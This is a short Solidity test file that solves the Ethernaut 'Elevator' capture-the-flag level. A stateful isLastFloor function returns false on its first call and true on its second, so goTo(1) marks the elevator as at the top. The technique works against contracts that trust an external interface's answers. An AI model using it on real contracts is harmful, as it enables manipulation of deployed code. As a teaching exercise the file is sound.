// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./base/EthernautTest.sol";

// Set actual level contract file
import "../../src/11_Elevator.sol";

contract LevelTest is EthernautTest, Building {

    bool called;

    function setUp() public {
        // Set actual level factory address
        levelSetUp(LEVEL_11_ELEVATOR_ADDRESS, 0);

        // Additional setup
    }

    function isLastFloor(uint) external returns (bool) {
        if(!called) {
            called = true;
            return false;
        } else {
            return true;
        }
    }

    function testAttack() public validateInstance {
        Elevator elevator = Elevator(levelInstance);
        
        elevator.goTo(1);
    }
}